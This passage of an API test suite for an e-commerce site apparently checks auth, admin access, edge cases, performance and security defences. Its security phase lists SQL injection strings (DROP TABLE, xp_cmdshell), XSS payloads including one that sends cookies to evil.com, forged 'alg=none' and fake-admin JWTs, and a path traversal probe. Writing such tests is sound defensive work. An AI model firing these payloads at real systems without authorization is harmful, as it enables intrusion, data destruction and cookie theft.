    assert(P, 'Public track: valid → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    // Wrong phone
    r = await request('GET', `/orders/track/public?orderNumber=${orderNumber}&phone=1111111111`);
    assert(P, 'Public track: wrong phone → 404', r.status === 404 || r.status === 400, `status=${r.status}`, r.duration, 'P1');
  }

  r = await request('GET', '/orders/track/public?orderNumber=FAKE123&phone=9876543210');
  assert(P, 'Public track: fake order → 404', r.status === 404, `status=${r.status}`, r.duration, 'P1');

  // ── Cancel Order ──

  if (orderId) {
    r = await request('PUT', `/orders/${orderId}/cancel`, { reason: 'QA test cancellation' }, userToken);
    assert(P, 'Cancel: valid reason → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    // Double cancel
    r = await request('PUT', `/orders/${orderId}/cancel`, { reason: 'double cancel' }, userToken);
    assert(P, 'Cancel: already cancelled → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');
  }

  // Cancel with short reason
  r = await request('PUT', `/orders/${orderId || '00000000-0000-0000-0000-000000000000'}/cancel`, { reason: 'hi' }, userToken);
  assert(P, 'Cancel: short reason → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // ── Returns ──

  console.log('\n  --- Returns ---');

  r = await request('GET', '/returns', null, userToken);
  assert(P, 'Returns: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
}

// ─── PHASE 2: WISHLIST & Q&A TESTS ──────────────────────────────────

async function testWishlistQA() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 2F: WISHLIST & Q&A TESTS');
  console.log('═'.repeat(60));

  const P = 'WISHLIST';

  if (!userToken) {
    record(P, 'SKIPPED', 'SKIP', 'No token', 0, 'P1');
    return;
  }

  // Wishlist
  let r = await request('GET', '/wishlist', null, userToken);
  assert(P, 'List: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  if (productId) {
    r = await request('POST', '/wishlist', { productId }, userToken);
    assert(P, 'Add: → 200/201', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P1');

    r = await request('GET', `/wishlist/check/${productId}`, null, userToken);
    assert(P, 'Check: exists → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    // Add duplicate
    r = await request('POST', '/wishlist', { productId }, userToken);
    assert(P, 'Add: duplicate → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

    r = await request('DELETE', `/wishlist/${productId}`, null, userToken);
    assert(P, 'Remove: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
  }

  // No auth
  r = await request('GET', '/wishlist');
  assert(P, 'List: no auth → 401', r.status === 401, `status=${r.status}`, r.duration, 'P1');

  // ── Q&A ──

  console.log('\n  --- Q&A ---');
  const PQ = 'Q&A';

  if (productId) {
    r = await request('GET', `/qa/product/${productId}`);
    assert(PQ, 'Get Q&A: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P2');

    r = await request('POST', `/qa/product/${productId}`, { question: 'Does this phone have 5G support?' }, userToken);
    assert(PQ, 'Ask question: → 200/201', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P2');

    // XSS in question
    r = await request('POST', `/qa/product/${productId}`, { question: '<script>document.cookie</script>' }, userToken);
    assert(PQ, 'Ask question: XSS → no script in response', !JSON.stringify(r.data).includes('<script>document'), `status=${r.status}`, r.duration, 'P0');
  }
}

// ─── PHASE 2: ADMIN PANEL TESTS ──────────────────────────────────────

async function testAdmin() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 2G: ADMIN PANEL TESTS');
  console.log('═'.repeat(60));

  const P = 'ADMIN';

  // Attempt to promote test user to admin via supabase
  try {
    const { createClient } = require('@supabase/supabase-js');
    const supaUrl = process.env.SUPABASE_URL;
    const supaKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
    if (supaUrl && supaKey && userId) {
      const supabase = createClient(supaUrl, supaKey);
      await supabase.from('users').update({ role: 'admin' }).eq('id', userId);
      const loginR = await request('POST', '/auth/login', { email: TEST_EMAIL, password: TEST_PASS });
      if (loginR.data.data?.accessToken) {
        adminToken = loginR.data.data.accessToken;
      }
    }
  } catch {
    console.log('  ℹ️ Supabase not available, using existing admin token if any');
  }

  // ── Privilege Escalation Tests ──

  console.log('\n  --- Privilege Escalation ---');

  // User token on admin endpoints
  if (userToken && !adminToken) {
    let r = await request('GET', '/admin/dashboard/stats', null, userToken);
    assert(P, 'Escalation: user → admin dashboard → 403', r.status === 403, `status=${r.status}`, r.duration, 'P0');

    r = await request('GET', '/admin/orders', null, userToken);
    assert(P, 'Escalation: user → admin orders → 403', r.status === 403, `status=${r.status}`, r.duration, 'P0');

    r = await request('POST', '/admin/products', { name: 'Hacked Product' }, userToken);
    assert(P, 'Escalation: user → create product → 403', r.status === 403 || r.status === 400, `status=${r.status}`, r.duration, 'P0');

    r = await request('DELETE', '/admin/products/some-id', null, userToken);
    assert(P, 'Escalation: user → delete product → 403', r.status === 403, `status=${r.status}`, r.duration, 'P0');

    r = await request('PUT', '/admin/settings', { storeName: 'Hacked' }, userToken);
    assert(P, 'Escalation: user → update settings → 403', r.status === 403, `status=${r.status}`, r.duration, 'P0');

    r = await request('POST', '/admin/wallet/admin/credit', { userId: 'x', amount: 999999 }, userToken);
    assert(P, 'Escalation: user → credit wallet → 403', r.status === 403, `status=${r.status}`, r.duration, 'P0');

    r = await request('PATCH', `/admin/users/${userId}/block`, null, userToken);
    assert(P, 'Escalation: user → block user → 403', r.status === 403, `status=${r.status}`, r.duration, 'P0');
  }

  // No auth on admin endpoints
  let r = await request('GET', '/admin/dashboard/stats');
  assert(P, 'NoAuth: admin dashboard → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  r = await request('GET', '/admin/orders');
  assert(P, 'NoAuth: admin orders → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  r = await request('GET', '/admin/users');
  assert(P, 'NoAuth: admin users → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  r = await request('GET', '/admin/crm/customers');
  assert(P, 'NoAuth: CRM → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  r = await request('GET', '/admin/activity-logs');
  assert(P, 'NoAuth: activity logs → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // ── Admin Operations (when admin token available) ──

  const token = adminToken || undefined;

  if (token) {
    console.log('\n  --- Admin Dashboard ---');

    r = await request('GET', '/admin/dashboard/stats', null, token);
    assert(P, 'Dashboard: stats → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    r = await request('GET', '/admin/dashboard/revenue', null, token);
    assert(P, 'Dashboard: revenue → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    r = await request('GET', '/admin/dashboard/top-products', null, token);
    assert(P, 'Dashboard: top products → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    r = await request('GET', '/admin/dashboard/recent-orders', null, token);
    assert(P, 'Dashboard: recent orders → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    console.log('\n  --- Admin Products ---');

    r = await request('GET', '/admin/products', null, token);
    assert(P, 'Products: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    console.log('\n  --- Admin Orders ---');

    r = await request('GET', '/admin/orders', null, token);
    assert(P, 'Orders: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    if (orderId) {
      r = await request('GET', `/admin/orders/${orderId}`, null, token);
      assert(P, 'Orders: get by ID → 200', r.status === 200 || r.status === 404, `status=${r.status}`, r.duration, 'P1');
    }

    console.log('\n  --- Admin Users ---');

    r = await request('GET', '/admin/users', null, token);
    assert(P, 'Users: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

    console.log('\n  --- Admin CRM ---');

    r = await request('GET', '/admin/crm/customers', null, token);
    assert(P, 'CRM: customers → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    r = await request('GET', '/admin/crm/segments', null, token);
    assert(P, 'CRM: segments → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    console.log('\n  --- Admin Notifications ---');

    r = await request('GET', '/admin/notifications', null, token);
    assert(P, 'Notifications: list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P2');

    r = await request('GET', '/admin/notifications/unread-count', null, token);
    assert(P, 'Notifications: unread count → 200', r.status === 200, `status=${r.status}`, r.duration, 'P2');

    console.log('\n  --- Admin Settings ---');

    r = await request('GET', '/admin/settings', null, token);
    assert(P, 'Settings: get → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    console.log('\n  --- Admin Returns ---');

    r = await request('GET', '/returns/admin/all', null, token);
    assert(P, 'Returns: admin list → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    console.log('\n  --- Admin POS ---');

    r = await request('GET', '/admin/pos/today-stats', null, token);
    assert(P, 'POS: today stats → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    console.log('\n  --- Admin Abandoned Carts ---');

    r = await request('GET', '/admin/abandoned-carts', null, token);
    assert(P, 'Abandoned carts: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P2');
  }
}

// ─── PHASE 3: EDGE CASE DESTRUCTION ──────────────────────────────────

async function testEdgeCases() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 3: EDGE CASE DESTRUCTION');
  console.log('═'.repeat(60));

  const P = 'EDGE';

  // Empty strings everywhere
  let r = await request('POST', '/auth/login', { email: '', password: '' });
  assert(P, 'Login: empty strings → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Null values
  r = await request('POST', '/auth/login', { email: null, password: null });
  assert(P, 'Login: null values → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  // Array instead of string
  r = await request('POST', '/auth/login', { email: ['a@b.com'], password: ['pass'] });
  assert(P, 'Login: arrays → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // Object instead of string
  r = await request('POST', '/auth/login', { email: { hack: true }, password: { inject: true } });
  assert(P, 'Login: objects → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // Number instead of string
  r = await request('POST', '/auth/login', { email: 12345, password: 67890 });
  assert(P, 'Login: numbers → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // Huge payload
  r = await request('POST', '/auth/login', {
    email: 'a'.repeat(100000) + '@test.com',
    password: 'b'.repeat(100000)
  });
  assert(P, 'Login: huge payload → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // Large array of products
  r = await request('GET', '/products?limit=10000');
  assert(P, 'Products: limit=10000 → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // Deeply nested JSON
  let deepObj: any = { email: 'test@test.com' };
  let current = deepObj;
  for (let i = 0; i < 50; i++) {
    current.nested = {};
    current = current.nested;
  }
  r = await request('POST', '/auth/login', deepObj);
  assert(P, 'Login: deeply nested JSON → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P2');

  // Invalid content type (handled by body parser)
  r = await request('GET', '/health');
  assert(P, 'Health: → 200', r.status === 200, `status=${r.status}`, r.duration, 'P0');

  // Non-existent routes
  r = await request('GET', '/api/doesnotexist');
  assert(P, 'Route: non-existent → 404', r.status === 404, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/api/../../../etc/passwd');
  assert(P, 'Route: path traversal → 404 or 400', r.status === 404 || r.status === 400, `status=${r.status}`, r.duration, 'P0');

  // HTTP methods on wrong routes
  r = await request('DELETE', '/products');
  assert(P, 'Method: DELETE /products → 404/405', r.status === 404 || r.status === 405 || r.status === 401, `status=${r.status}`, r.duration, 'P1');

  r = await request('PUT', '/auth/login', { email: 'x', password: 'x' });
  assert(P, 'Method: PUT /auth/login → 404', r.status === 404, `status=${r.status}`, r.duration, 'P2');

  // Unicode in paths
  r = await request('GET', '/products/категория/тест');
  assert(P, 'Unicode: in path → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P2');

  // Double encoding
  r = await request('GET', '/products?search=%2527%2520OR%25201%253D1');
  assert(P, 'Double encoding: → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // ── CORS ──
  console.log('\n  --- CORS ---');

  // Request with no Origin (server-to-server)
  r = await request('GET', '/products');
  assert(P, 'CORS: no Origin → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  // ── Cache Headers ──
  console.log('\n  --- Cache Behavior ---');

  r = await request('GET', '/products');
  const cacheHeader = r.headers['cache-control'] || '';
  assert(P, 'Cache: products has Cache-Control', cacheHeader.length > 0, `header=${cacheHeader}`, r.duration, 'P2');

  // ── Special Characters ──
  console.log('\n  --- Special Characters ---');

  const specialChars = ['<', '>', '"', "'", '&', '\\', '/', '\n', '\r', '\t', '\0'];
  for (const char of specialChars) {
    r = await request('GET', `/products?search=${encodeURIComponent(char)}`);
    assert(P, `Special char '${char.replace(/\n/g, '\\n').replace(/\r/g, '\\r').replace(/\t/g, '\\t').replace(/\0/g, '\\0')}' → no crash`, r.status !== 500, `status=${r.status}`, r.duration, 'P1');
  }
}

// ─── PHASE 4: SECURITY ATTACK MODE ──────────────────────────────────

async function testSecurity() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 4: SECURITY ATTACK MODE');
  console.log('═'.repeat(60));

  const P = 'SECURITY';

  // ── SQL Injection ──

  console.log('\n  --- SQL Injection Payloads ---');

  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "1' AND 1=1 UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "1; UPDATE users SET role='admin' WHERE email='attacker@test.com'",
    "' UNION SELECT password FROM users WHERE ''='",
    "1' WAITFOR DELAY '0:0:5'--",
    "'; EXEC xp_cmdshell('whoami');--",
    "' OR 1=1; SELECT pg_sleep(5);--",
    "'\"; DROP TABLE products; --",
    "1)) OR ((1=1",
  ];

  for (const payload of sqlPayloads) {
    const r = await request('GET', `/products?search=${encodeURIComponent(payload)}`);
    assert(P, `SQLi search: ${payload.substring(0, 40)}`, r.status !== 500 && r.duration < 10000, `s=${r.status} t=${r.duration}ms`, r.duration, 'P0');
  }

  // SQL injection in category slug
  let r = await request('GET', `/categories/${encodeURIComponent("' OR 1=1--")}`);
  assert(P, 'SQLi: category slug', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // SQL injection in product slug
  r = await request('GET', `/products/${encodeURIComponent("' UNION SELECT * FROM users--")}`);
  assert(P, 'SQLi: product slug', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // ── XSS Attacks ──

  console.log('\n  --- XSS Payloads ---');

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert('XSS')",
    '<iframe src="javascript:alert(1)">',
    '{{constructor.constructor("return this")()}}',
    '${alert(1)}',
    '<a href="javascript:void(0)" onclick="alert(1)">click</a>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<body onload=alert(1)>',
  ];

  for (const payload of xssPayloads) {
    const r = await request('GET', `/products?search=${encodeURIComponent(payload)}`);
    const containsScript = JSON.stringify(r.data).includes('<script>') || JSON.stringify(r.data).includes('onerror=');
    assert(P, `XSS search: ${payload.substring(0, 35)}`, !containsScript && r.status !== 500, `script_in_resp=${containsScript}`, r.duration, 'P0');
  }

  // XSS in registration
  if (userToken) {
    r = await request('PUT', '/auth/profile', { name: '<img src=x onerror=fetch("http://evil.com/steal?c="+document.cookie)>' }, userToken);
    assert(P, 'XSS: profile name → no script reflect', r.status !== 500, `status=${r.status}`, r.duration, 'P0');
  }

  // ── JWT Manipulation ──

  console.log('\n  --- JWT Attacks ---');

  // None algorithm attack
  const noneToken = Buffer.from('{"alg":"none","typ":"JWT"}').toString('base64url') + '.' +
    Buffer.from(`{"userId":"${userId}","role":"admin"}`).toString('base64url') + '.';
  r = await request('GET', '/auth/profile', null, noneToken);
  assert(P, 'JWT: alg=none → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // Wrong signature
  if (userToken) {
    const parts = userToken.split('.');
    const wrongSig = parts[0] + '.' + parts[1] + '.WRONGsignature';
    r = await request('GET', '/auth/profile', null, wrongSig);
    assert(P, 'JWT: wrong signature → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');
  }

  // Elevated role in JWT payload
  const adminPayload = Buffer.from(`{"userId":"${userId || '1'}","role":"admin","iat":${Math.floor(Date.now()/1000)},"exp":${Math.floor(Date.now()/1000)+3600}}`).toString('base64url');
  const fakeAdmin = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + adminPayload + '.fakeSignature';
  r = await request('GET', '/admin/dashboard/stats', null, fakeAdmin);
  assert(P, 'JWT: fake admin role → 401', r.status === 401, `status=${r.status}`, r.duration, 'P0');

  // ── Direct API Abuse ──

  console.log('\n  --- Direct API Abuse ---');

  // Admin endpoints without token
  const adminEndpoints = [
    '/admin/dashboard/stats', '/admin/orders', '/admin/users',
    '/admin/products', '/admin/settings', '/admin/crm/customers',
    '/admin/notifications', '/admin/abandoned-carts', '/admin/pos/orders',
    '/admin/barcode/lookup/TEST', '/admin/product-views',
  ];

  for (const ep of adminEndpoints) {
    r = await request('GET', ep);
    assert(P, `Admin bypass: GET ${ep.substring(0, 30)} → 401`, r.status === 401, `status=${r.status}`, r.duration, 'P0');
  }

  // ── IDOR (Insecure Direct Object Reference) ──

  console.log('\n  --- IDOR Tests ---');

  // Try accessing another user's data
  if (userToken) {
    r = await request('GET', '/orders/00000000-0000-0000-0000-000000000001', null, userToken);
    assert(P, 'IDOR: access other user order → 404 (not 200)', r.status === 404 || r.status === 403, `status=${r.status}`, r.duration, 'P0');

    r = await request('DELETE', '/users/addresses/00000000-0000-0000-0000-000000000001', null, userToken);
    assert(P, 'IDOR: delete other user address → 404/403', r.status === 404 || r.status === 403, `status=${r.status}`, r.duration, 'P0');
  }

  // ── Mass Assignment ──

  console.log('\n  --- Mass Assignment ---');

  if (userToken) {
    r = await request('PUT', '/auth/profile', { role: 'admin', is_blocked: false, is_verified: true }, userToken);
    assert(P, 'Mass assign: set role=admin in profile update', true, `status=${r.status}`, r.duration, 'P0');
    // Verify role didn't change
    r = await request('GET', '/auth/profile', null, userToken);
    const role = r.data.data?.role || r.data.data?.user?.role;
    assert(P, 'Mass assign: role still user (not admin)', role !== 'admin' || !userId, `role=${role}`, 0, 'P0');
  }

  // ── Parameter Pollution ──

  console.log('\n  --- Parameter Pollution ---');

  r = await request('GET', '/products?page=1&page=2&page=3');
  assert(P, 'Param pollution: multiple page values → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  r = await request('GET', '/products?limit=5&limit=10000');
  assert(P, 'Param pollution: multiple limit values → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P1');

  // ── Response Header Security ──

  console.log('\n  --- Security Headers ---');

  r = await request('GET', '/products');
  assert(P, 'Header: X-Content-Type-Options', r.headers['x-content-type-options'] === 'nosniff', `val=${r.headers['x-content-type-options']}`, 0, 'P1');
  assert(P, 'Header: X-Frame-Options', !!r.headers['x-frame-options'], `val=${r.headers['x-frame-options']}`, 0, 'P1');
  assert(P, 'Header: Content-Security-Policy', !!r.headers['content-security-policy'], `exists=${!!r.headers['content-security-policy']}`, 0, 'P1');
  assert(P, 'Header: Strict-Transport-Security', !!r.headers['strict-transport-security'], `exists=${!!r.headers['strict-transport-security']}`, 0, 'P1');
  assert(P, 'Header: No X-Powered-By', !r.headers['x-powered-by'], `val=${r.headers['x-powered-by']}`, 0, 'P1');
  assert(P, 'Header: Referrer-Policy', !!r.headers['referrer-policy'], `val=${r.headers['referrer-policy']}`, 0, 'P1');

  // ── Wallet Manipulation ──

  console.log('\n  --- Wallet Abuse ---');

  if (userToken) {
    r = await request('GET', '/wallet/balance', null, userToken);
    assert(P, 'Wallet: get balance → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    // Try admin credit as regular user
    r = await request('POST', '/wallet/admin/credit', { userId, amount: 999999, reason: 'hax' }, userToken);
    assert(P, 'Wallet: user tries admin credit → 403', r.status === 403, `status=${r.status}`, r.duration, 'P0');
  }
}

// ─── PHASE 5: PERFORMANCE TESTS ─────────────────────────────────────

async function testPerformance() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 5: PERFORMANCE TESTS');
  console.log('═'.repeat(60));

  const P = 'PERF';

  // ── Response Time Checks ──

  console.log('\n  --- Response Times ---');

  const endpoints: { name: string; path: string; threshold: number }[] = [
    { name: 'Health', path: '/health', threshold: 500 },
    { name: 'Products list', path: '/products', threshold: 3000 },
    { name: 'Categories', path: '/categories', threshold: 2000 },
    { name: 'Brands', path: '/brands', threshold: 2000 },
    { name: 'Banners', path: '/banners', threshold: 2000 },
    { name: 'Featured', path: '/products/featured', threshold: 3000 },
    { name: 'Trending', path: '/products/trending', threshold: 3000 },
    { name: 'Settings', path: '/settings', threshold: 2000 },
    { name: 'Search', path: '/products?search=samsung', threshold: 3000 },
  ];

  for (const ep of endpoints) {
    const r = await request('GET', ep.path);
    assert(P, `Latency: ${ep.name} < ${ep.threshold}ms`, r.duration < ep.threshold, `duration=${r.duration}ms`, r.duration, 'P1');
  }

  // ── Concurrent Request Burst ──

  console.log('\n  --- Concurrent Burst (50 requests) ---');

  const burst = [];
  for (let i = 0; i < 50; i++) {
    burst.push(request('GET', '/products'));
  }
  const burstStart = Date.now();
  const burstResults = await Promise.all(burst);
  const burstDuration = Date.now() - burstStart;
  const burstSuccess = burstResults.filter(r => r.status === 200).length;
  const burstErrors = burstResults.filter(r => r.status === 500).length;
  assert(P, `Burst: ${burstSuccess}/50 success in ${burstDuration}ms`, burstErrors === 0, `500s=${burstErrors}`, burstDuration, 'P0');

  // ── Sequential Rapid Requests ──

  console.log('\n  --- Sequential Rapid Requests ---');

  const seqStart = Date.now();
  for (let i = 0; i < 20; i++) {
    await request('GET', '/products?page=' + (i + 1));
  }
  const seqDuration = Date.now() - seqStart;
  assert(P, `Sequential: 20 paginated requests in ${seqDuration}ms`, seqDuration < 60000, `avg=${Math.round(seqDuration/20)}ms`, seqDuration, 'P1');

  // ── Mixed Endpoint Stress ──

  console.log('\n  --- Mixed Endpoint Stress ---');

  const mixedPaths = [
    '/products', '/categories', '/brands', '/banners', '/products/featured',
    '/products/trending', '/products?search=apple', '/products?minPrice=100&maxPrice=500',
  ];

  const mixed = [];
  for (let i = 0; i < 100; i++) {
    mixed.push(request('GET', mixedPaths[i % mixedPaths.length]));
  }
  const mixedStart = Date.now();
  const mixedResults = await Promise.all(mixed);
  const mixedDuration = Date.now() - mixedStart;
  const mixed500s = mixedResults.filter(r => r.status === 500).length;
  assert(P, `Mixed 100 requests: ${mixed500s} 500-errors`, mixed500s === 0, `duration=${mixedDuration}ms`, mixedDuration, 'P0');

  // ── Auth Endpoint Stress ──

  if (userToken) {
    console.log('\n  --- Auth Endpoint Stress ---');

    const authBurst = [];
    for (let i = 0; i < 30; i++) {
      authBurst.push(request('GET', '/auth/profile', null, userToken));
    }
    const authResults = await Promise.all(authBurst);
    const auth500s = authResults.filter(r => r.status === 500).length;
    assert(P, `Auth burst: 30 profile requests, ${auth500s} 500s`, auth500s === 0, `success=${authResults.filter(r => r.status === 200).length}`, 0, 'P1');
  }
}

// ─── PHASE 6: WALLET & MISC TESTS ───────────────────────────────────

async function testWalletAndMisc() {
  console.log('\n' + '═'.repeat(60));
  console.log('PHASE 6: WALLET, CONTACT, SETTINGS');
  console.log('═'.repeat(60));

  const P = 'MISC';

  // ── Contact Form ──

  console.log('\n  --- Contact Form ---');

  let r = await request('POST', '/contact', {
    name: 'QA Tester', email: 'qa@test.com',
    subject: 'Test message', message: 'This is a test contact submission from QA suite.'
  });
  assert(P, 'Contact: valid submission → 200/201', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P1');

  r = await request('POST', '/contact', {});
  assert(P, 'Contact: empty body → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');

  r = await request('POST', '/contact', {
    name: '<script>alert(1)</script>', email: 'xss@test.com',
    subject: 'XSS', message: '<img src=x onerror=alert(1)>'
  });
  assert(P, 'Contact: XSS → no crash', r.status !== 500, `status=${r.status}`, r.duration, 'P0');

  // ── Service Requests ──

  console.log('\n  --- Service Requests ---');

  r = await request('POST', '/service-requests', {
    name: 'QA Tester', email: 'qa@test.com', phone: '9876543210',
    deviceType: 'smartphone', deviceBrand: 'Samsung', deviceModel: 'Galaxy S25',
    issueDescription: 'Screen cracked during QA testing simulation'
  });
  assert(P, 'Service: submit → 200/201', r.status === 200 || r.status === 201, `status=${r.status}`, r.duration, 'P1');

  // ── Settings ──

  r = await request('GET', '/settings');
  assert(P, 'Settings: get → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

  // ── Wallet ──

  if (userToken) {
    r = await request('GET', '/wallet/balance', null, userToken);
    assert(P, 'Wallet: balance → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');

    r = await request('GET', '/wallet/transactions', null, userToken);
    assert(P, 'Wallet: transactions → 200', r.status === 200, `status=${r.status}`, r.duration, 'P1');
  }

  // ── Coupons ──

  console.log('\n  --- Coupons ---');

  r = await request('POST', '/coupons/validate', { code: 'TESTCODE' });
  assert(P, 'Coupon: validate non-existent → 400/404', r.status === 400 || r.status === 404, `status=${r.status}`, r.duration, 'P1');

  r = await request('POST', '/coupons/validate', { code: '' });
  assert(P, 'Coupon: validate empty → 400', r.status === 400, `status=${r.status}`, r.duration, 'P1');
}

// ─── MAIN EXECUTION ─────────────────────────────────────────────────

async function main() {
  console.log('╔══════════════════════════════════════════════════════════╗');
  console.log('║  AMOHA MOBILES - EXHAUSTIVE QA TEST SUITE               ║');
  console.log('║  Target: ' + BASE_URL.padEnd(48) + '║');
  console.log('║  Time: ' + new Date().toISOString().padEnd(50) + '║');
  console.log('╚══════════════════════════════════════════════════════════╝');

  const startTime = Date.now();

  await testAuth();
  await testProducts();
  await testCart();
  await testCheckout();
  await testOrders();
  await testWishlistQA();
  await testAdmin();
  await testEdgeCases();
  await testSecurity();
  await testPerformance();
  await testWalletAndMisc();

  const totalDuration = Date.now() - startTime;

  // ─── FINAL REPORT ──────────────────────────────────────────────────

  console.log('\n' + '═'.repeat(60));
  console.log('FINAL REPORT');
  console.log('═'.repeat(60));

  console.log(`\n  Total Tests: ${results.length}`);
  console.log(`  ✅ PASS:  ${totalPass}`);
  console.log(`  ❌ FAIL:  ${totalFail}`);
  console.log(`  ⚠️ WARN:  ${totalWarn}`);
  console.log(`  ⏭️ SKIP:  ${totalSkip}`);
  console.log(`  ⏱  Duration: ${(totalDuration / 1000).toFixed(1)}s`);

  // Failed tests by priority
  const failures = results.filter(r => r.status === 'FAIL');
  if (failures.length > 0) {
    console.log('\n  ── FAILURES ──');
    const p0Fails = failures.filter(f => f.priority === 'P0');
    const p1Fails = failures.filter(f => f.priority === 'P1');
    const p2Fails = failures.filter(f => f.priority === 'P2');

    if (p0Fails.length > 0) {
      console.log(`\n  🔴 P0 CRITICAL (${p0Fails.length}):`);
      p0Fails.forEach(f => console.log(`     ❌ [${f.phase}] ${f.name} — ${f.details}`));
    }
    if (p1Fails.length > 0) {
      console.log(`\n  🟠 P1 IMPORTANT (${p1Fails.length}):`);
      p1Fails.forEach(f => console.log(`     ❌ [${f.phase}] ${f.name} — ${f.details}`));
    }
    if (p2Fails.length > 0) {
      console.log(`\n  🟡 P2 MINOR (${p2Fails.length}):`);
      p2Fails.forEach(f => console.log(`     ❌ [${f.phase}] ${f.name} — ${f.details}`));
    }
  }

  // Phase summary
  console.log('\n  ── BY PHASE ──');
  const phases = [...new Set(results.map(r => r.phase))];
  for (const phase of phases) {
    const phaseResults = results.filter(r => r.phase === phase);
    const pass = phaseResults.filter(r => r.status === 'PASS').length;
    const fail = phaseResults.filter(r => r.status === 'FAIL').length;
    console.log(`     ${phase.padEnd(12)} ${pass}✅ ${fail}❌ / ${phaseResults.length} total`);
  }

  console.log('\n' + '═'.repeat(60));

  // Exit code
  process.exit(totalFail > 0 ? 1 : 0);
}

main().catch(err => {
  console.error('Fatal error:', err);
  process.exit(2);
});
